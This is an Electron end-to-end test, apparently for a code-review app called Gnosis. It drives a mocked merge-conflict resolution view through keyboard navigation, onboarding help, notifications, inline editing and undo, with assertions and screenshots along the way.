import { loadWorkbenchPage, waitForWorkbenchQueue, waitSettled } from './workbench-ready';
import { perfBudget, withinPerf } from './perf-budget';
import { chooseWorkspaceMenuItem } from './workspace-menu';
import { blockFingerprints } from '../lib/conflict-stats';
import { typeCheckKey } from '../lib/conflict-verify';
import { parsePatchFiles } from '@pierre/diffs';
import assert from 'node:assert/strict';
import { app, BrowserWindow } from 'electron';
app.disableHardwareAcceleration();
import { execFileSync } from 'node:child_process';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
void app.whenReady().then(async () => {
  const win = new BrowserWindow({
    width: 1280,
    height: 900,
    show: true,
    webPreferences: { contextIsolation: true, sandbox: true, backgroundThrottling: false },
  });
  win.webContents.on('console-message', (event) => {
    if (event.message.includes('Error')) console.error(event.message);
  });
  // A failed script names itself, so a failure says which step it was.
  const js = <T = unknown>(code: string) =>
    (win.webContents.executeJavaScript(code) as Promise<T>).catch((error: unknown) => {
      throw new Error(`${error instanceof Error ? error.message : String(error)}\n${code.slice(0, 400)}`);
    });
  const wait = async (code: string) => {
    for (let n = 0; n < 400; n++) {
      if (await js(code)) return;
      await new Promise((r) => setTimeout(r, 30));
    }
    throw Error(
      `Timed out: ${code}\nFocus: ${await js<string>('document.activeElement?.outerHTML.slice(0,300)')}\n${await js<string>('document.body.innerText')}`
    );
  };
  // Button names without their keyboard hints.
  const visibleButton = (label: string) =>
    `[...document.querySelectorAll('button,a[data-slot=button]')].find(b=>{if(!b.checkVisibility())return false;const c=b.cloneNode(true);c.querySelectorAll('kbd').forEach(k=>k.remove());return c.textContent.trim()===${JSON.stringify(label)};})`;
  // Every way back is an item of the band's Reset menu (#445 distill): `click` and `exists` open it for these.
  const RESET_ITEMS = ['Reset file', 'Start from Git’s conflict', 'Try structural merge again', 'Start over with latest code…'];
  const menuItem = (label: string) =>
    `[...document.querySelectorAll('.conflict-reset-menu [role=menuitem]')].find(e=>e.textContent.trim()===${JSON.stringify(label)})`;
  const resetMenu = async (open: boolean) => {
    const shown = await js<boolean>("!!document.querySelector('.conflict-reset-menu')");
    if (shown === open) return shown;
    if (!open) {
      await js("document.querySelector('.conflict-reset-menu').dispatchEvent(new KeyboardEvent('keydown',{key:'Escape',bubbles:true}))");
      await wait("!document.querySelector('.conflict-reset-menu')");
      return false;
    }
    if (!(await js<boolean>("!!document.querySelector('[data-conflict-reset]:not(:disabled)')"))) return false;
    await js(
      "(()=>{const b=document.querySelector('[data-conflict-reset]');b.focus();b.dispatchEvent(new KeyboardEvent('keydown',{key:'Enter',bubbles:true}))})()"
    );
    await wait("!!document.querySelector('.conflict-reset-menu')");
    return true;
  };
  const resetItem = async (label: string) => {
    const found = (await resetMenu(true)) && (await js<boolean>(`!!(${menuItem(label)})`));
    await resetMenu(false);
    return found;
  };
  const click = async (label: string) => {
    if (RESET_ITEMS.includes(label) && !(await js<boolean>(`!!(${visibleButton(label)})`))) {
      for (let n = 0; n < 200 && !(await resetItem(label)); n++) await new Promise((r) => setTimeout(r, 30));
      await resetMenu(true);
      await wait(`(${menuItem(label)}) && !(${menuItem(label)}).hasAttribute('data-disabled')`);
      await js(`(${menuItem(label)}).click()`);
      await wait("!document.querySelector('.conflict-reset-menu')");
      return;
    }
    await wait(`(${visibleButton(label)}) && !(${visibleButton(label)}).disabled`);
    await js(`(${visibleButton(label)}).click()`);
  };
  const exists = (label: string) =>
    RESET_ITEMS.includes(label) ? resetItem(label) : js<boolean>(`!!(${visibleButton(label)})`);
  const key = async (value: string) => {
    const named: Record<string, [string, number]> = { Enter: ['Enter', 13], Escape: ['Escape', 27], ' ': ['Space', 32] };
    const [code, vk] = named[value] ?? [
      /\d/.test(value) ? `Digit${value}` : `Key${value.toUpperCase()}`,
      value.toUpperCase().charCodeAt(0),
    ];
    await win.webContents.debugger.sendCommand('Input.dispatchKeyEvent', {
      type: 'keyDown',
      key: value,
      code,
      windowsVirtualKeyCode: vk,
      ...(value === 'Enter' ? { text: '\r' } : value.length === 1 ? { text: value } : {}),
    });
    await win.webContents.debugger.sendCommand('Input.dispatchKeyEvent', {
      type: 'keyUp',
      key: value,
      code,
      windowsVirtualKeyCode: vk,
    });
    await new Promise((r) => setTimeout(r, 150));
  };
  const publishes = () => js<number>("window.conflictCalls.filter(r=>r.kind==='publish').length");
  /** Cmd+Enter on macOS, Ctrl+Enter elsewhere: the one key that presses a focused Push button. */
  const modEnter = async (modifier?: 'meta' | 'ctrl') => {
    const mac = await js<boolean>("window.electronAPI.platform==='darwin'");
    const modifiers = (modifier ?? (mac ? 'meta' : 'ctrl')) === 'meta' ? 4 : 2;
    for (const type of ['keyDown', 'keyUp'] as const)
      await win.webContents.debugger.sendCommand('Input.dispatchKeyEvent', {
        type,
        key: 'Enter',
        code: 'Enter',
        windowsVirtualKeyCode: 13,
        modifiers,
        ...(type === 'keyDown' ? { text: '\r' } : {}),
      });
    await new Promise((r) => setTimeout(r, 150));
  };
  /** The confirmation's groups (#445 item 12): each one's count and whether it is open. */
  const confirmGroupsShown = () =>
    js<Record<string, { count: string; open: string }>>(
      "Object.fromEntries([...document.querySelectorAll('.conflict-confirm [data-confirm-group]')].map(g=>[g.dataset.confirmGroup,{count:g.querySelector('[data-confirm-count]').textContent,open:g.querySelector('.conflict-disclosure').getAttribute('aria-expanded')}]))"
    );
  const pushButton = () => js(`(${visibleButton('Push merge commit')}).focus()`);
  const calls = (kind: string) => js<number>(`window.conflictCalls.filter(r=>r.kind===${JSON.stringify(kind)}).length`);
  const dir = path.resolve('.impeccable/review/conflict-resolution');
  const capture = async (name: string) => {
    await js('document.fonts.ready');
    await new Promise((r) => setTimeout(r, 300));
    fs.mkdirSync(dir, { recursive: true });
    fs.writeFileSync(path.join(dir, `${name}.png`), (await win.webContents.capturePage()).toPNG());
  };
  const resize = async (width: number, height: number) => {
    win.setSize(width, height);
    await new Promise((r) => setTimeout(r, 300));
  };
  /** Light, dark and narrow captures of one state. The window returns to its size and theme. */
  const captureAll = async (name: string) => {
    const [width, height] = win.getSize();
    const dark = await js<boolean>("document.documentElement.classList.contains('dark')");
    const focused = await js<boolean>('(window.__focus=document.activeElement, true)');
    await js("document.documentElement.classList.remove('dark')");
    await capture(`${name}-light`);
    await js("document.documentElement.classList.add('dark')");
    await capture(`${name}-dark`);
    await resize(760, 800);
    await capture(`${name}-narrow-dark`);
    await js("document.documentElement.classList.remove('dark')");
    await capture(`${name}-narrow-light`);
    if (dark) await js("document.documentElement.classList.add('dark')");
    await resize(width, height);
    if (focused) await js('window.__focus?.focus?.({preventScroll:true})');
  };
  /** Every visible footer button sits inside the footer, the footer inside the dialog, and code above it. */
  const footerFits = () =>
    js<boolean>(`(()=>{
      const footer=document.querySelector('.conflict-footer');if(!footer)return false;
      const f=footer.getBoundingClientRect();const d=document.querySelector('.conflict-workspace').getBoundingClientRect();
      const scroll=document.querySelector('.conflict-scroll')?.getBoundingClientRect();
      const buttons=[...footer.querySelectorAll('button')].filter(b=>b.checkVisibility());
      return buttons.length>0&&f.bottom<=d.bottom+0.5&&f.top>=d.top&&(!scroll||scroll.bottom<=f.top+0.5)&&
        buttons.every(b=>{const r=b.getBoundingClientRect();return r.top>=f.top-0.5&&r.bottom<=f.bottom+0.5&&r.left>=d.left-0.5&&r.right<=d.right+0.5;});
    })()`);
  const stage = () => js<string>("document.querySelector('.conflict-files [aria-current=true] [data-stage]')?.dataset.stage");
  const primary = () => js<string>("document.querySelector('[data-conflict-primary]')?.dataset.conflictPrimary");
  /** Every proposal's checks have finished: no block or summary still says it is checking. */
  const checksDone = () =>
    wait(
      "!!document.querySelector('.conflict-workspace') && !/Checking the result|Checking \\d+ results?…/.test(document.querySelector('.conflict-workspace')?.textContent ?? '')"
    );
  const block = (index: number) => `document.querySelector('.conflict-block[data-conflict-index="${index}"]')`;
  const activeBlock = () =>
    js<string | null>("document.activeElement?.closest('.conflict-block')?.dataset.conflictIndex ?? null");
  /** Conflict `index`'s in-place editor (#445 item 11): the editable surface inside its card. */
  const inlineEditor = (index: number, scope = 'document') =>
    `${scope}.querySelector('[data-conflict-inline-edit="${index}"] diffs-container')?.shadowRoot?.querySelector('[contenteditable=true]')`;
  /** Opens conflict `index`'s editor from its card, types `text` where the caret starts, and saves. */
  const editInline = async (index: number, text: string, scope = 'document') => {
    const card = `${scope}.querySelector('.conflict-block[data-conflict-index="${index}"]')`;
    await js(`${card}.querySelector('[data-conflict-edit]').click()`);
    const editor = inlineEditor(index, scope);
    // The editor takes focus once it has rendered.
    await wait(`!!${editor} && ${editor}.getRootNode().activeElement===${editor}`);
    const save = `${scope}.querySelector('[data-conflict-inline-edit="${index}"] [data-conflict-edit-save]')`;
    await js(`window.__inlineEditor=${editor}`);
    await win.webContents.debugger.sendCommand('Input.insertText', { text });
    try {
      await wait(`!!${save} && !${save}.disabled`);
    } catch (error) {
      const state = await js<string>(
        `JSON.stringify({text:${editor}?.textContent,same:window.__inlineEditor===${editor},connected:window.__inlineEditor?.isConnected,active:${editor}?.getRootNode().activeElement===${editor},sel:String(${editor}?.getRootNode().getSelection?.()?.anchorNode?.textContent),inert:!!document.querySelector('[data-conflict-inline-edit]')?.closest('[inert]'),editable:${editor}?.isContentEditable,busy:document.querySelector('.conflict-footer-status')?.textContent,hasFocus:document.hasFocus()})`
      );
      throw new Error(`The editor: ${state}`, { cause: error });
    }
    await js(`${save}.click()`);
    await wait(`!${scope}.querySelector('[data-conflict-inline-edit]')`);
  };
  const open = () =>
    js("window.dispatchEvent(new CustomEvent('gnosis-resolve-conflicts',{detail:window.conflictFixture.url}))");
  try {
    await loadWorkbenchPage(win, `${process.env.GNOSIS_WORKBENCH_URL}?pr-summary&checks`);
    win.webContents.debugger.attach('1.3');
    await win.webContents.debugger.sendCommand('Emulation.setFocusEmulationEnabled', { enabled: true });
    await waitForWorkbenchQueue(win.webContents);
    const patch =
      'diff --git a/src/retry.ts b/src/retry.ts\n--- a/src/retry.ts\n+++ b/src/retry.ts\n@@ -1 +1 @@\n-export const delay = 5000;\n+export const delay = 3000;\n' +
      'diff --git a/src/clock.ts b/src/clock.ts\n--- a/src/clock.ts\n+++ b/src/clock.ts\n@@ -1 +1 @@\n-export const tick = 10;\n+export const tick = 20;\n';
    await js(`window.conflictPreview=${JSON.stringify(parsePatchFiles(patch).flatMap((p) => p.files))}`);
    await js(`(()=>{
      const original='export function retryDelay(attempt: number) {\\n<<<<<<< feature/retry\\n  return Math.min(attempt * 200, 5000);\\n||||||| ancestor\\n  return attempt * 200;\\n=======\\n  return Math.max(100, attempt * 200);\\n>>>>>>> main\\n}\\n<<<<<<< feature/retry\\nexport const retries = 5;\\n=======\\nexport const retries = 3;\\n>>>>>>> main\\n';
      window.conflictFixture={id:'a'.repeat(64),account:'oddur',url:'https://github.com/klang/engine/pull/120',title:'Bound retry delays',headRepo:'klang/engine',baseRepo:'klang/engine',headBranch:'feature/retry',baseBranch:'main',headSha:'a'.repeat(40),baseSha:'b'.repeat(40),tree:'c'.repeat(40),version:1,status:'editing',files:[{path:'src/retry.ts',mode:'100644',base:'export function retryDelay(attempt: number) {\\n  return attempt * 200;\\n}\\nexport const retries = 4;\\n',ours:'export function retryDelay(attempt: number) {\\n  return Math.min(attempt * 200, 5000);\\n}\\nexport const retries = 5;\\n',theirs:'export function retryDelay(attempt: number) {\\n  return Math.max(100, attempt * 200);\\n}\\nexport const retries = 3;\\n',original,result:original,resolved:false,source:'manual'}]};
      window.conflictCalls=[];
      // The opt-in type check (#445 item 24): off until a step sets a status and tells the view it changed.
      window.typeCheckState=null;window.typeCheckListeners=[];window.typeCheckCancels=0;
      window.electronAPI.conflictTypeCheck=async()=>window.typeCheckState;
      window.electronAPI.cancelConflictTypeCheck=async()=>{window.typeCheckCancels++;};
      window.electronAPI.onConflictTypeCheckChanged=cb=>{window.typeCheckListeners.push(cb);return()=>{window.typeCheckListeners=window.typeCheckListeners.filter(x=>x!==cb);};};
      window.electronAPI.conflictResolution=async req=>{
        window.conflictCalls.push(req);const s=window.conflictFixture;
        if(req.kind==='open'){if(window.failOpen)throw Error(window.failOpen);if(window.slowOpen)await new Promise(r=>setTimeout(r,window.slowOpen));return {session:structuredClone(s)};}
        // As the service does: a save from an earlier version lands while its file is the one it started from.
        if(req.version!==s.version){const f=req.kind==='save'&&req.base!==undefined&&req.version<s.version?s.files.find(f=>f.path===req.path):undefined;if(!f)throw Error('The saved resolution changed. Reopen the workspace before continuing.');if(window.draftKey(f)!==req.base)throw Error(window.draftChanged);}
        if(req.kind==='save'){const f=s.files.find(f=>f.path===req.path);if(f.result!==req.contents){f.source='manual';f.explanation=undefined;}f.result=req.contents;f.resolved=req.resolved;if(req.picks)f.picks=req.picks.some(Boolean)?req.picks:undefined;if(req.edits)f.edits=req.edits.some(Boolean)?req.edits:undefined;}
        if(req.kind==='resolve'&&req.engine==='whole-file'){const f=s.files.find(f=>f.path===req.path);if(!f?.wholeFile)throw Error('This file has no whole-file proposal.');f.result=f.wholeFile.text;f.resolverText=f.wholeFile.text;f.explanation='You used structural merge’s result for the whole file. Review it before marking the file reviewed.';f.resolved=false;f.source=f.wholeFile.source==='mergiraf'?'mergiraf':'manual';}
        else if(req.kind==='resolve'){s.files[0].explanation='Preserved the minimum delay from main and the cap from this PR. Tests have not been run. It differed on 2 conflicts already decided; those keep their text.';}
        if(req.kind==='preview')return {session:structuredClone(s),preview:{token:'reviewed',patch:'',validation:'',files:window.conflictPreview}};
        if(req.kind==='publish'){if(window.failPublish)throw Error("Error invoking remote method 'conflict-resolution': Error: Git could not complete this operation. To github.com:klang/engine.git\\n ! [rejected]        feature/retry (stale info)\\nerror: failed to push some refs");s.status='published';s.commitSha='d'.repeat(40);}
        s.version++;return {session:structuredClone(s)};
      };
    })()`);
    await js(
      "import('/lib/conflict-resolution.ts').then(m=>{window.draftKey=m.fileDraftKey;window.draftChanged=m.FILE_DRAFT_CHANGED;})"
    );
    await js(`(async()=>{
      const stack=(await window.electronAPI.workbenchQueue()).items.find(i=>i.subject.kind==='stack');
      const read=window.electronAPI.getQueueSignals;
      window.electronAPI.getQueueSignals=async requests=>(await read(requests)).map(value=>value.url.endsWith('/120')?{...value,readiness:{...value.readiness,mergeable:'CONFLICTING',mergeState:'DIRTY'}}:value);
      const {publishQueueSignals}=await import('/lib/use-queue-signals.ts');
      publishQueueSignals('oddur',await window.electronAPI.getQueueSignals(stack.subject.members.map(({url,headSha})=>({url,headSha}))));
    })()`);
    // The row menu offers Resolve conflicts only for conflicts, or while GitHub has not answered.
    const rowMenuOffers = async (mergeable: string, mergeState: string, checkedAt: number) => {
      await js(`(async()=>{
        const pr=(await window.electronAPI.workbenchQueue()).items.flatMap(i=>i.subject.members).find(m=>m.number===152);
        const [value]=await window.electronAPI.getQueueSignals([{url:pr.url,headSha:pr.headSha}]);
        const {publishQueueSignals}=await import('/lib/use-queue-signals.ts');
        publishQueueSignals('oddur',[{...value,checkedAt:${checkedAt},readiness:{...value.readiness,mergeable:${JSON.stringify(mergeable)},mergeState:${JSON.stringify(mergeState)}}}]);
      })()`);
      await js(
        `(()=>{const b=[...document.querySelectorAll('button')].find(b=>b.getBoundingClientRect().width&&b.getAttribute('aria-label')==='Actions for PR #152');b.focus();b.dispatchEvent(new KeyboardEvent('keydown',{key:'ArrowDown',bubbles:true}))})()`
      );
      await wait("[...document.querySelectorAll('[role=menuitem]')].some(e=>e.textContent==='Copy PR link')");
      const offered = await js<boolean>("[...document.querySelectorAll('[role=menuitem]')].some(e=>e.textContent==='Resolve conflicts…')");
      win.webContents.sendInputEvent({ type: 'keyDown', keyCode: 'Escape' });
      await wait("!document.querySelector('[role=menu]')");
      return offered;
    };
    const later = Date.now() + 3_600_000;
    assert.equal(await rowMenuOffers('MERGEABLE', 'CLEAN', later), false, 'A PR ready to merge has nothing to resolve');
    assert.equal(await rowMenuOffers('MERGEABLE', 'BEHIND', later + 1), false, 'A PR only behind main updates instead');
    assert.equal(await rowMenuOffers('UNKNOWN', 'UNKNOWN', later + 2), true, 'GitHub is still computing');
    assert.equal(await rowMenuOffers('CONFLICTING', 'DIRTY', later + 3), true);
    await js(
      "document.querySelector('.queue-disclosure').closest('.queue-item').querySelector('.queue-row-main').dispatchEvent(new MouseEvent('dblclick',{bubbles:true}))"
    );
    await click('Resolve conflicts…');
    await wait("document.querySelector('.conflict-block[data-state=open]')");
    assert.equal(await js('window.conflictCalls[0].url'), 'https://github.com/klang/engine/pull/120');

    // P0: the conflict view speaks Gnosis. Versions are labelled; Git's markers and words never show.
    await wait("document.activeElement?.closest('.conflict-block')");
    assert.equal(await activeBlock(), '0', 'Opening focuses the first unresolved conflict, not Close');
    assert.deepEqual(await js(`[...${block(0)}.querySelectorAll('.conflict-side-label')].map(e=>e.textContent)`), [
      'This PR · feature/retry',
      'main',
    ]);
    assert.equal(
      await js(`${block(0)}.querySelector('.conflict-ancestor summary').textContent`),
      'Before both changes'
    );
    assert.equal(
      await js(`${block(0)}.querySelector('.conflict-ancestor').open`),
      false,
      'The ancestor starts collapsed'
    );
    assert.equal(
      await js(`!!${block(1)}.querySelector('.conflict-ancestor')`),
      false,
      'A two-way conflict has no ancestor'
    );
    assert.doesNotMatch(
      await js<string>("document.querySelector('.conflict-view').innerText"),
      /<{7}|>{7}|={7}|\|{7}|Current Change|Incoming Change/
    );
    assert.deepEqual(
      await js(`[...${block(0)}.querySelectorAll('.conflict-block-actions button')].map(b=>b.textContent.replace(/\\d$/,'').trim())`),
      ['Keep PR change', 'Keep main’s change', 'Keep both', 'Edit'],
      'Each card has one Edit action (#445 item 11)'
    );
    assert.equal(await exists('Save draft'), false, 'Drafts save automatically');
    // No step rail, no guide and no engine menu: the summary and the footer say where you are, and the keys are one
    // tooltip away.
    assert.equal(await js("!!document.querySelector('.conflict-workspace .step-list, #conflict-help')"), false);
    assert.equal(await exists('Guide'), false);
    assert.equal(await exists('Suggest a resolution'), false);
    assert.ok(await js("!!document.querySelector('[data-conflict-keys][aria-label=\"Keyboard shortcuts\"]')"));
    assert.equal(await js("document.querySelector('.conflict-save-state').textContent"), 'Saved');

    // First run (components/ConflictOnboarding.tsx): one compact panel under the summary explains Merged, Check and
    // Decide, the main keys and the type check, once per account, and never takes focus from the first conflict.
    const guide = "document.querySelector('[data-conflict-guide]')";
    const note = (name: string) => `document.querySelector('[data-conflict-note="${name}"]')`;
    const tipsSeen = async () =>
      (JSON.parse((await js<string | null>("localStorage.getItem('gnosis:conflict-tips:oddur')")) ?? '[]') as string[]).sort();
    assert.equal(await js(`${guide}.dataset.conflictGuide`), 'full');
    assert.deepEqual(await js(`[...${guide}.querySelectorAll('dt')].map(e=>e.textContent)`), ['Merged', 'Check', 'Decide']);
    assert.match(await js<string>(`${guide}.textContent`), /proposes only when you ask.*Nothing is pushed until you push\./);
    assert.equal(await js(`!!${guide}.querySelector('.lucide-bot') && !document.querySelector('.conflict-workspace .lucide-sparkles')`), true);
    assert.equal(
      await js(`${guide}.querySelector('[data-conflict-guide-keys]').textContent`),
      'JK move · A use the proposal · 123 keep · M mark reviewed · All keys'
    );
    // The type check is off and the PR is TypeScript: the panel's last line, with a link to the setting.
    assert.match(await js<string>(`${guide}.querySelector('[data-conflict-guide-type-check]').textContent`), /type-check the merge.*It’s off\. Repository settings/);
    assert.ok((await js<number>(`${guide}.getBoundingClientRect().height`)) <= 120, 'The panel stays compact');
    assert.equal(await js("document.querySelectorAll('.conflict-notes > .conflict-note').length"), 0, 'No separate bands');
    assert.equal(await activeBlock(), '0', 'The help never takes focus');
    assert.equal(await js("document.querySelector('[data-conflict-guide-toggle]').getAttribute('aria-expanded')"), 'true');
    await captureAll('first-run');
    // Narrow, the panel is one line, so the first conflict stays in view; a click opens it.
    await resize(760, 800);
    await wait(`${guide}?.dataset.conflictGuide==='compact' && innerWidth===760`);
    assert.ok(await js<boolean>(`${block(0)}.getBoundingClientRect().top < innerHeight - 120`), 'The first conflict stays above the fold');
    await js(`${guide}.querySelector('.conflict-guide-expand').click()`);
    await wait(`${guide}?.dataset.conflictGuide==='full'`);
    await wait(`document.activeElement===${guide}`);
    await capture('first-run-narrow-expanded');
    await resize(1280, 900);
    await wait('innerWidth===1280');
    // All keys points at the full legend under the keyboard button.
    await js(`[...${guide}.querySelectorAll('.conflict-guide-link')].find(b=>b.textContent==='All keys').click()`);
    await wait("document.activeElement?.matches('[data-conflict-keys]') && !!document.querySelector('.conflict-keys')");
    await js(`[...${guide}.querySelectorAll('.conflict-guide-link')].find(b=>b.textContent==='Repository settings').click()`);
    await wait("[...document.querySelectorAll('[role=dialog] h2')].some(h=>h.textContent==='Repository settings')");
    await key('Escape');
    await wait("!document.querySelector('[role=dialog]') && !!document.querySelector('.conflict-workspace')");
    // One Got it closes the whole panel for good; the summary's help button brings it back on demand.
    await click('Got it');
    await wait(`!${guide}`);
    assert.equal(await js("document.activeElement?.classList.contains('conflict-workspace')"), true, 'Got it hands focus to the view');
    assert.deepEqual(await tipsSeen(), ['buckets']);
    await click('Close');
    await wait("!document.querySelector('.conflict-workspace')");
    await open();
    await wait("document.activeElement?.closest('.conflict-block')");
    assert.equal(await js(`!!${guide}`), false, 'Dismissed help stays dismissed');
    await js("document.querySelector('[data-conflict-guide-toggle]').click()");
    await wait(`${guide}?.dataset.conflictGuide==='full'`);
    assert.equal(await js("document.querySelector('[data-conflict-guide-toggle]').getAttribute('aria-expanded')"), 'true');
    await capture('guide-reopened');
    await js("document.querySelector('[data-conflict-guide-toggle]').click()");
    await wait(`!${guide}`);
    await js(`${block(0)}.focus()`);

    // A physical pointer click must dismiss the notification, not the conflict workspace.
    await js(
      `(async()=>{const {toast}=await import('/components/ui/toast.tsx');toast.add({title:'Conflict notification regression',description:'A background result is ready.',timeout:0});})()`
    );
    await wait('document.querySelector(\'.app-toast [aria-label="Dismiss notification"]\')');
    // The Conflicts view is a PR tab (#445 item 8), not a modal: notifications use the app's own viewport.
    assert.equal(await js("document.querySelector('.conflict-workspace').contains(document.querySelector('.app-toast'))"), false);
    assert.equal(await js("document.querySelector('.app-toast').getAttribute('role')"), 'group');
    // Notifications sit above the view's footer, never over its controls.
    const toastClearsFooter =
      "document.querySelector('.app-toasts').getBoundingClientRect().bottom <= document.querySelector('.conflict-footer').getBoundingClientRect().top + 0.5";
    await wait(toastClearsFooter);
    await capture('notification');
    await js(
      "(document.querySelector('.activity-trigger')?.click() ?? window.dispatchEvent(new KeyboardEvent('keydown',{key:'a',shiftKey:true,metaKey:window.electronAPI.platform==='darwin',ctrlKey:window.electronAPI.platform!=='darwin'})))"
    );
    await wait("document.querySelector('.activity-drawer')");
    await capture('notification-activity');
    await js('document.querySelector(\'[aria-label="Close activity"]\').click()');

    await resize(760, 800);
    await wait(toastClearsFooter);
    await capture('notification-narrow');
    assert.ok(await footerFits(), 'The footer stays visible with a notification');
    await resize(1280, 900);
    await js('document.querySelector(\'.app-toast [aria-label="Dismiss notification"]\').focus()');
    assert.ok(
      await js("document.activeElement?.getAttribute('aria-label')==='Dismiss notification'"),
      'The view permits keyboard focus on notifications'
    );
    const toastPoint = await js<{ x: number; y: number }>(
      `(()=>{const r=document.querySelector('.app-toast [aria-label="Dismiss notification"]').getBoundingClientRect();return {x:r.x+r.width/2,y:r.y+r.height/2}})()`
    );
    for (const type of ['mousePressed', 'mouseReleased'])
      await win.webContents.debugger.sendCommand('Input.dispatchMouseEvent', {
        type,
        ...toastPoint,
        button: 'left',
        clickCount: 1,
      });
    await new Promise((r) => setTimeout(r, 350));
    assert.ok(
      await js("!!document.querySelector('.conflict-workspace')"),
      'Dismissing a notification must not close Resolve conflicts'
    );
    await wait("!document.querySelector('.app-toast')");
    // Moving back to the global viewport keeps pending notifications and their actions.
    await js(
      `(async()=>{const {toast}=await import('/components/ui/toast.tsx');toast.add({title:'Background result',timeout:0});})()`
    );
    await click('Close');
    await wait("!document.querySelector('.conflict-workspace') && document.querySelector('.app-toast')");
    assert.equal(await js("!!document.querySelector('.app-toast-host .app-toast')"), false);
    await js('document.querySelector(\'.app-toast [aria-label="Dismiss notification"]\').click()');
    await wait("!document.querySelector('.app-toast')");

    // The Conflicts tab never carries to another PR: moving to the next PR opens it on Summary, and prepares nothing.
    await open();
    await wait("document.querySelector('.conflict-workspace') && document.querySelector('.pr-overview-tabs [role=tab][data-state=active]')?.textContent==='Conflicts'");
    const opens = await calls('open');
    const step = await js<string>("document.querySelector('[aria-label=\"Next change\"]:not(:disabled)') ? 'Next change' : 'Previous change'");
    await js(`document.querySelector('[aria-label="${step}"]').click()`);
    await wait(
      "!document.querySelector('.conflict-workspace') && document.querySelector('.pr-overview-tabs [role=tab][data-state=active]')?.textContent==='Summary'"
    );
    assert.equal(await calls('open'), opens, 'No conflict session is prepared for the other PR');
    assert.equal(await js("[...document.querySelectorAll('.pr-overview-tabs [role=tab]')].some(t=>t.textContent==='Conflicts')"), false);

    // Opening focuses the first conflict that needs you.
    await open();
    await wait("document.activeElement?.closest('.conflict-block')");
    await captureAll('conflicts');
    // The keys are listed on hover or focus of the keyboard button, as in the shortcut overlay.
    await js("document.querySelector('[data-conflict-keys]').focus()");
    await wait("document.querySelector('.conflict-keys')?.textContent.includes('Next / previous conflict')");
    await capture('keyboard-help');
    await js(`${block(0)}.focus()`);
    await wait("!document.querySelector('.conflict-keys')");
    assert.equal(await js("!!document.querySelector('.conflict-workspace .step-card-count')"), false);
    assert.equal(
      await js("document.querySelector('.conflict-workspace').textContent.includes('Nothing pushed')"),
      false
    );

    // Keyboard: J/K move between conflicts, 1/2/3 keep a side, and each choice leaves a note with Undo.
    await js(`${block(0)}.focus()`);
    await key('j');
    assert.equal(await activeBlock(), '1');
    await key('k');
    assert.equal(await activeBlock(), '0');
    await key('1');
    await wait(`${block(0)}?.dataset.state==='kept'`);
    assert.match(await js<string>(`${block(0)}.querySelector('.conflict-kept').textContent`), /Kept PR change·Undo/);
    assert.equal(await activeBlock(), '1', 'A choice moves focus to the next open conflict');
    await key('2');
    await wait(`${block(1)}?.dataset.state==='kept'`);
    assert.equal(await stage(), 'resolved');
    assert.equal(
      await js("document.querySelector('.conflict-files [aria-current=true] [data-stage]').textContent"),
      'Resolved · needs review'
    );
    // The result is in the diff already: the next step is Mark reviewed, with no Review result mode in between.
    await wait("document.activeElement?.dataset.conflictPrimary==='mark-reviewed'");
    // Undo one block; the other keeps its choice.
    await js(`[...${block(0)}.querySelectorAll('button')].find(b=>['Undo','Decide myself','Remove proposal'].includes(b.textContent.trim())).click()`);
    await wait(`${block(0)}?.dataset.state==='open'`);
    assert.equal(await js(`${block(1)}.dataset.state`), 'kept');
    assert.equal(await stage(), 'conflicted');
    assert.equal(await activeBlock(), '0', 'Undo returns focus to the reopened conflict');
    await key('3');
    await wait(`${block(0)}?.dataset.state==='kept'`);
    assert.match(await js<string>(`${block(0)}.querySelector('.conflict-kept').textContent`), /Kept both changes/);

    // Edit in place (#445 item 11): a Decide conflict's Edit opens its lines in an editor under them, in the diff.
    // Save changes that conflict's span only; the edit is yours; Undo restores the choice it replaced.
    const prefix = 'export function retryDelay(attempt: number) {\n';
    const suffix = '}\nexport const retries = 3;\n';
    assert.equal(await exists('Edit result'), false, 'No whole-file editor mode');
    assert.equal(await exists('Review result'), false, 'No Review result mode');
    assert.equal(await js("!!document.querySelector('.conflict-modes')"), false);
    await js(`[...${block(0)}.querySelectorAll('button')].find(b=>['Undo','Decide myself','Remove proposal'].includes(b.textContent.trim())).click()`);
    await wait(`${block(0)}?.dataset.state==='open'`);
    await wait("window.conflictFixture.files[0].result.includes('<<<<<<<')");
    await editInline(0, '// merged by hand\n');
    await wait(`${block(0)}?.dataset.state==='edited'`);
    assert.match(await js<string>(`${block(0)}.querySelector('.conflict-kept').textContent`), /Edited by you·Undo/);
    await wait("document.querySelector('.conflict-save-state')?.textContent==='Saved'");
    await wait("window.conflictFixture.files[0].result.includes('// merged by hand')");
    const edited = await js<{ result: string; picks: unknown; source: string }>(
      '(({result,picks,source})=>({result,picks,source}))(window.conflictFixture.files[0])'
    );
    assert.ok(edited.result.startsWith(prefix) && edited.result.endsWith(suffix), `Nothing outside the conflict changed: ${edited.result}`);
    assert.equal(
      edited.result.slice(prefix.length, edited.result.length - suffix.length),
      '// merged by hand\n  return Math.min(attempt * 200, 5000);\n  return Math.max(100, attempt * 200);\n',
      'The editor started from both sides, PR first, and your line went into the conflict'
    );
    assert.deepEqual(edited.picks, [null, 'theirs'], 'The edit clears your pick for that conflict only');
    assert.equal(edited.source, 'manual', 'The service saves the file as your edit');
    assert.equal(await stage(), 'resolved');
    assert.equal(await primary(), 'mark-reviewed');
    // The line you typed is never marked as Gnosis's.
    assert.equal(
      await js("[...document.querySelectorAll('.conflict-compare-diff:not([hidden]) diffs-container')].some(h=>h.shadowRoot?.querySelector('[data-written-line]'))"),
      false
    );
    await captureAll('inline-edited');
    // The edit is saved with the draft, as picks are: after a reopen the card still says so, with Undo and Edit.
    assert.deepEqual(
      await js('window.conflictFixture.files[0].edits?.map(e=>e&&[e.before,e.pick])'),
      [[null, null]]
    );
    const reopen = async (state: string) => {
      await click('Close');
      await wait("!document.querySelector('.conflict-workspace')");
      await open();
      await wait(`${block(0)}?.dataset.state===${JSON.stringify(state)}`);
    };
    await reopen('edited');
    assert.ok(await js(`!!${block(0)}.querySelector('[data-conflict-edit]')`), 'Edit is still there');
    assert.equal(await js(`${block(1)}?.dataset.state`), 'kept', 'The other conflict keeps its Keep');
    // Undo returns the conflict to Decide, as it was before the edit.
    await js(`[...${block(0)}.querySelectorAll('button')].find(b=>['Undo','Decide myself','Remove proposal'].includes(b.textContent.trim())).click()`);
    await wait(`${block(0)}?.dataset.state==='open'`);
